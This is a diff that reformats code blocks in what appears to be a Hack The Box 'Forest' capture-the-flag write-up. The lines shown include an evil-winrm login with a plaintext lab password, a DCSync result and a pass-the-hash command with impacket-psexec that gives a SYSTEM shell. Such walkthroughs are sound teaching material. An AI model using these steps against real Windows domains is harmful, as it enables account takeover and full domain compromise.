@@ -145,15 +145,14 @@ $ nxc winrm htb.local -u svc-alfresco -p s3rvice
 ```
 Looks like we can remote in with svc-alfresco. Let's grab that user flag.
 
-```bash {class="flag-capture"}
-$ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
+<pre class="flag-capture"><code>$ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
                                         
 Evil-WinRM shell v3.5                                        
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\Desktop\user.txt
 f6db3..[REDACTED]..04e285cb
-```
+</code></pre>
 
 ## Finding the Path to Domain Admin
 Our next step is to figure out what we have access to and how we can get to Domain Admin. Since we have a set of working credentials we can use BloodHound to help us enumerate the domain.
@@ -222,8 +221,7 @@ DefaultAccount:503:[LM]:[NT-HASH-REDACTED]:::
 ```
 ## Domain Admin
 The DCSync attack was a success! We now have the Administrator NT hash. Since NTLM authentication accepts a hash in lieu of a password, we don't need to crack it. We can Pass-the-hash with impacket-psexec to give us a SYSTEM shell and the final flag.
-```bash {class="flag-capture"}
-$ impacket-psexec htb.local/administrator@"10.129.95.210" -hashes :[REDACTED NT HASH]
+<pre class="flag-capture"><code>$ impacket-psexec htb.local/administrator@"10.129.95.210" -hashes :[REDACTED NT HASH]
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Requesting shares on 10.129.95.210.....
@@ -241,7 +239,7 @@ nt authority\system
 
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 f8a8...[REDACTED]...d010
-```
+</code></pre>
 We have successfully compromised the domain.
 
 ## Takeaways
